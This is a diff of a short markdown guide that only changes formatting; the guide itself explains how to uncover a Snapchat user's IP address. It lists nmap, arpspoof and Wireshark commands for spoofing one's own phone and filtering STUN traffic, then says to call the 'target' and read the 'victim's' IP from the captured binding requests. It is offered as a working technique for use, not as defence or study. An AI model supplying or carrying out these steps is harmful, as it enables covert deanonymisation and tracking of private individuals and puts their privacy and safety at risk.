@@ -20,29 +20,29 @@
 
 **Find your Devices local ip and write it down.**
 - nmap -sn (or -sP) <gateway ip>/24
-<br>
+
 **Example:**
 - nmap -sn 192.168.0.1/24
-<br>
+  
 **Spoof your phone.**
 - arpspoof -i -t gateway
-<br>
+
 **Example:**
 - arpspoof -i en0 -t 192.168.0.160 192.168.0.1
-<br>
+
 **Sometimes you need to reverse arpspoof aswell so to be safe, switch gateway with phone ip:**
 - arpspoof -i en0 -t 192.168.0.1 192.168.0.160
-<br>
+
 **Fire up Wireshark and filter on your phone ip with STUN protocol**
--- ip.addr == <phone ip> && stun
-<br>
+- ip.addr == <phone ip> && stun
+  
 **Example:** 
 - ip.addr == 192.168.0.160 && stun
-<br>
+
 **Call the Target on snap and keep calling them for around 5 seconds.
 Wireshark should throw up some binding requests, then some other STUN ones.
 Those last ones are your victim's ip.**
-<br>
+
 **Example**
 - https://ibb.co/yN4sJjK
 - https://ibb.co/hBzCgwB <---- graph to snapchat osint
